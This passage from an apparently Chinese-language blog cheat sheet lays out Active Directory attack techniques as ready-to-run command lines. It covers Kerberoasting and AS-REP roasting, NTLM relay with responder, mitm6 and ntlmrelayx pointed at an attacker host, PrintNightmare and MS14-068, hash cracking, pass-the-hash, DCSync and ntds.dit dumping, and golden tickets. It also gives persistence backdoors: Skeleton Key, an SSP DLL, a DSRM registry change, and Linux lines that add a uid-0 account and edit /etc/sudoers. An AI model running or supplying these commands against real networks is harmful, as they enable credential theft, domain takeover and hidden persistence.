<h4 id="获取asrep-roastable账号"><a class="markdownIt-Anchor" href="#获取asrep-roastable账号">#</a> 获取 ASREP-Roastable 账号</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired -Properties SamAccountName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>
<h2 id="拿到任意一个域用户的账号密码"><a class="markdownIt-Anchor" href="#拿到任意一个域用户的账号密码">#</a> 拿到任意一个域用户的账号密码</h2>
<h3 id="获取其他账户密码"><a class="markdownIt-Anchor" href="#获取其他账户密码">#</a> 获取其他账户密码</h3>
<h4 id="1获取域内所有账户名"><a class="markdownIt-Anchor" href="#1获取域内所有账户名">#</a> 1. 获取域内所有账户名</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;</span><br></pre></td></tr></table></figure>
<h4 id="2枚举-smb-共享"><a class="markdownIt-Anchor" href="#2枚举-smb-共享">#</a> 2. 枚举 SMB 共享</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</span><br></pre></td></tr></table></figure>
<h4 id="3bloodhound"><a class="markdownIt-Anchor" href="#3bloodhound">#</a> 3.bloodhound</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</span><br></pre></td></tr></table></figure>
<h4 id="4powerview-pywerview"><a class="markdownIt-Anchor" href="#4powerview-pywerview">#</a> 4.powerview / pywerview</h4>
<h3 id="kerberoasting攻击"><a class="markdownIt-Anchor" href="#kerberoasting攻击">#</a> Kerberoasting 攻击</h3>
<h4 id="获取hash-2"><a class="markdownIt-Anchor" href="#获取hash-2">#</a> 获取 hash</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</span><br><span class="line"></span><br><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure>
<h4 id="查找-kerberoastable-账号"><a class="markdownIt-Anchor" href="#查找-kerberoastable-账号">#</a> 查找 kerberoastable 账号</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) RETURN u</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>
<h3 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068">#</a> MS14-068</h3>
<p><a target="_blank" rel="noopener" href="http://FindSMB2UPTime.py">FindSMB2UPTime.py</a> <ip></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames &lt;name&gt;</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&#x27;&lt;password&gt;&#x27;@&lt;target&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;&lt;ticket&gt;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="printnightmare"><a class="markdownIt-Anchor" href="#printnightmare">#</a> PrintNightmare</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#x27;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="枚举-dns-服务器"><a class="markdownIt-Anchor" href="#枚举-dns-服务器">#</a> 枚举 DNS 服务器</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnstool.py -u &#x27;DOMAIN\user&#x27; -p &#x27;password&#x27; --record &#x27;*&#x27; --action query &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure>
<h1 id="7relaypoisoning攻击"><a class="markdownIt-Anchor" href="#7relaypoisoning攻击">#</a> 7.relay/poisoning 攻击</h1>
<h3 id="扫描没开启smb签名的机器"><a class="markdownIt-Anchor" href="#扫描没开启smb签名的机器">#</a> 扫描没开启 SMB 签名的机器</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line"></span><br><span class="line">cme smb $hosts --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>
<h3 id="petitpotam"><a class="markdownIt-Anchor" href="#petitpotam">#</a> PetitPotam</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>
<p>后续可以跟着 adcs 攻击</p>
<h3 id="监听"><a class="markdownIt-Anchor" href="#监听">#</a> 监听</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responder -i eth0</span><br><span class="line">mitm6 -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>
<h2 id="无smb签名-开启ipv6-adcs"><a class="markdownIt-Anchor" href="#无smb签名-开启ipv6-adcs">#</a> 无 SMB 签名 || 开启 IPv6 || ADCS</h2>
<h3 id="1ms08-068"><a class="markdownIt-Anchor" href="#1ms08-068">#</a> 1.MS08-068</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay 	#常用于windows2003 / windows server2008</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 # 记得先关闭本机的 smb 和 http 服务</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt </span><br></pre></td></tr></table></figure>
<h3 id="2mitm6-i-eth0-d-domain"><a class="markdownIt-Anchor" href="#2mitm6-i-eth0-d-domain">#</a> 2.mitm6 -i eth0 -d <domain></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l /tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access</span><br><span class="line"></span><br><span class="line">getST.py -spn cifs/&lt;target&gt; &lt;domain&gt;/&lt;netbios_name&gt;\$ -impersonate &lt;user&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3adcs"><a class="markdownIt-Anchor" href="#3adcs">#</a> 3.adcs</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t http://&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</span><br></pre></td></tr></table></figure>
<h2 id="拿到hash破解"><a class="markdownIt-Anchor" href="#拿到hash破解">#</a> 拿到 hash 破解</h2>
<h4 id="1lm"><a class="markdownIt-Anchor" href="#1lm">#</a> 1.LM</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format=lm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>
<h4 id="2ntlm"><a class="markdownIt-Anchor" href="#2ntlm">#</a> 2.NTLM</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format=nt hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>
<h4 id="3ntlmv1"><a class="markdownIt-Anchor" href="#3ntlmv1">#</a> 3.NTLMv1</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format=netntlm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5500 -a 3 hash.txt</span><br></pre></td></tr></table></figure>
<h4 id="4ntlmv2"><a class="markdownIt-Anchor" href="#4ntlmv2">#</a> 4.NTLMv2</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format=netntlmv2 hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
<h4 id="5kerberos-5-tgs"><a class="markdownIt-Anchor" href="#5kerberos-5-tgs">#</a> 5.Kerberos 5 TGS</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john spn.txt --format=krb5tgs --wordlist=rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 spn.txt rockyou.txt</span><br></pre></td></tr></table></figure>
<h4 id="6kerberos-asrep"><a class="markdownIt-Anchor" href="#6kerberos-asrep">#</a> 6.Kerberos ASREP</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</span><br></pre></td></tr></table></figure>
<h1 id="9横向移动"><a class="markdownIt-Anchor" href="#9横向移动">#</a> 9. 横向移动</h1>
<h2 id="1pth"><a class="markdownIt-Anchor" href="#1pth">#</a> 1.PTH</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;</span><br><span class="line"></span><br><span class="line">evil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;</span><br></pre></td></tr></table></figure>
<h2 id="2ptk"><a class="markdownIt-Anchor" href="#2ptk">#</a> 2.PTK</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;</span><br><span class="line">export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache</span><br><span class="line">python psexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -k -no-pass</span><br><span class="line"></span><br><span class="line">Rubeus asktgt /user:victim /rc4:&lt;rc4value&gt;</span><br><span class="line">Rubeus ptt /ticket:&lt;ticket&gt;</span><br><span class="line">Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</span><br><span class="line">Rubeus ptt /luid:0xdeadbeef /ticket:&lt;ticket&gt;</span><br></pre></td></tr></table></figure>
<h2 id="3非约束委派"><a class="markdownIt-Anchor" href="#3非约束委派">#</a> 3. 非约束委派</h2>
<h3 id="获取票据"><a class="markdownIt-Anchor" href="#获取票据">#</a> 获取票据</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line">Rubeus dump /service:krbtgt /nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump /luid:0xdeadbeef /nowrap</span><br></pre></td></tr></table></figure>
<h3 id="查找非约束委派主机"><a class="markdownIt-Anchor" href="#查找非约束委派主机">#</a> 查找非约束委派主机</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -Unconstrained -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>
<h2 id="4约束委派"><a class="markdownIt-Anchor" href="#4约束委派">#</a> 4. 约束委派</h2>
<h3 id="获取票据-2"><a class="markdownIt-Anchor" href="#获取票据-2">#</a> 获取票据</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets /export sekurlsa::tickets /</span><br><span class="line"></span><br><span class="line">Rubeus dump /service:krbtgt /nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump /luid:0xdeadbeef /nowrap</span><br></pre></td></tr></table></figure>
<h3 id="查找约束委派主机"><a class="markdownIt-Anchor" href="#查找约束委派主机">#</a> 查找约束委派主机</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>
<h2 id="5基于资源的约束委派"><a class="markdownIt-Anchor" href="#5基于资源的约束委派">#</a> 5. 基于资源的约束委派</h2>
<h2 id="6dcsync"><a class="markdownIt-Anchor" href="#6dcsync">#</a> 6.dcsync</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:htb.local /user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行</span><br></pre></td></tr></table></figure>
<h2 id="7打印机-spoolservice-漏洞利用"><a class="markdownIt-Anchor" href="#7打印机-spoolservice-漏洞利用">#</a> 7. 打印机 SpoolService 漏洞利用</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</span><br><span class="line">printerbug.py &#x27;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#x27;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</span><br></pre></td></tr></table></figure>
<h2 id="8ad域acl攻击aclpwnpy"><a class="markdownIt-Anchor" href="#8ad域acl攻击aclpwnpy">#</a> 8.AD 域 ACL 攻击 (<a target="_blank" rel="noopener" href="http://aclpwn.py">aclpwn.py</a>)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GenericAll on User</span><br><span class="line">GenericAll on Group</span><br><span class="line">GenericAll / GenericWrite / Write on Computer</span><br><span class="line">WriteProperty on Group</span><br><span class="line">Self (Self-Membership) on Group</span><br><span class="line">WriteProperty (Self-Membership)</span><br><span class="line">ForceChangePassword</span><br><span class="line">WriteOwner on Group</span><br><span class="line">GenericWrite on User</span><br><span class="line">WriteDACL + WriteOwner</span><br></pre></td></tr></table></figure>
<h2 id="9获取laps管理员密码"><a class="markdownIt-Anchor" href="#9获取laps管理员密码">#</a> 9. 获取 LAPS 管理员密码</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</span><br><span class="line"></span><br><span class="line">foreach ($objResult in $colResults)&#123;$objComputer = $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="10privexchange漏洞"><a class="markdownIt-Anchor" href="#10privexchange漏洞">#</a> 10.privexchange 漏洞</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://&lt;dc_fqdn&gt;--escalate-user &lt;user&gt;</span><br></pre></td></tr></table></figure>
<h5 id="exchange的利用"><a class="markdownIt-Anchor" href="#exchange的利用">#</a> Exchange 的利用</h5>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li>
</ul>
<h2 id="11ipc"><a class="markdownIt-Anchor" href="#11ipc">#</a> 11.IPC</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</span><br><span class="line">net use \\ip\c$ &quot;password&quot; /user:&quot;administrator&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="12其他横移"><a class="markdownIt-Anchor" href="#12其他横移">#</a> 12. 其他横移</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.向WSUS服务器数据库注入恶意程序更新		WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器</span><br><span class="line"></span><br><span class="line">2.MSSQL Trusted Links			use exploit/windows/mssql/mssql_linkcrawler</span><br><span class="line"></span><br><span class="line">3.GPO Delegation</span><br><span class="line"></span><br><span class="line">4.ADCS</span><br><span class="line"></span><br><span class="line">5.钉钉 6.3.5 RCE https://github.com/crazy0x70/dingtalk-RCE</span><br><span class="line"></span><br><span class="line">6.向日葵11.1 RCE</span><br></pre></td></tr></table></figure>
<h1 id="10权限维持"><a class="markdownIt-Anchor" href="#10权限维持">#</a> 10. 权限维持</h1>
<h2 id="拿到域控权限"><a class="markdownIt-Anchor" href="#拿到域控权限">#</a> 拿到域控权限</h2>
<p>dump ntds.dit 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</span><br><span class="line"></span><br><span class="line">secretsdump.py &#x27;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#x27;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</span><br><span class="line"></span><br><span class="line">secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</span><br><span class="line"></span><br><span class="line">windows/gather/credentials/domain_hashdump</span><br></pre></td></tr></table></figure>
<h2 id="windows后门"><a class="markdownIt-Anchor" href="#windows后门">#</a> Windows 后门</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; myuser /add /domain</span><br><span class="line"></span><br><span class="line">Golden ticket（黄金票据）</span><br><span class="line"></span><br><span class="line">Silver Ticket（白银票据）</span><br><span class="line"></span><br><span class="line">DSRM 后门：</span><br><span class="line">PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</span><br><span class="line"></span><br><span class="line">Skeleton Key：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">自定义 SSP DLL：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure>
<h2 id="linux后门"><a class="markdownIt-Anchor" href="#linux后门">#</a> Linux 后门</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> # echo &quot;0range ALL=(ALL) ALL&quot; &gt;&gt; /etc/sudoers 	将现有普通用户添加为 sudo 用户</span><br><span class="line"> # useradd -u 0 -g 0 -o adv -m -s /bin/bash 	添加超管账户</span><br><span class="line">ps: 相比贸然去新增用户, 把系统中现有的普通用户提升为 sudo 用户可能会更靠谱点</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="域信任关系"><a class="markdownIt-Anchor" href="#域信任关系">#</a> 域信任关系</h2>
<h3 id="子域攻击父域-sid-history版跨域黄金票据"><a class="markdownIt-Anchor" href="#子域攻击父域-sid-history版跨域黄金票据">#</a> 子域攻击父域 - SID History 版跨域黄金票据</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid</span><br><span class="line"></span><br><span class="line">mimikatz lsadump::trust</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt</span><br></pre></td></tr></table></figure>
<h3 id="利用域信任密钥获取目标域的权限-信任票据"><a class="markdownIt-Anchor" href="#利用域信任密钥获取目标域的权限-信任票据">#</a> 利用域信任密钥获取目标域的权限 - 信任票据</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;lsadump::trust /patch&quot;</span><br><span class="line">&quot;lsadump::lsa /patch&quot;</span><br><span class="line"></span><br><span class="line">&quot;kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:  </span><br><span class="line">&lt;domain_SID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:&lt;target_domain&gt; /ticket:</span><br><span class="line">&lt;golden_ticket_path&gt;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="攻击其它林"><a class="markdownIt-Anchor" href="#攻击其它林">#</a> 攻击其它林</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击</span><br></pre></td></tr></table></figure>
<h2 id="活动目录持久性技巧"><a class="markdownIt-Anchor" href="#活动目录持久性技巧">#</a> 活动目录持久性技巧</h2>
<p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a> DS 恢复模式密码维护 DSRM 密码同步</p>
<blockquote>
<p>Windows Server 2008 需要安装 KB961320 补丁才支持 DSRM 密码同步，Windows Server 2003 不支持 DSRM 密码同步。KB961320:<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni, 可参考：</a><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-9297.html">巧用 DSRM 密码同步将域控权限持久化</a></p>
</blockquote>
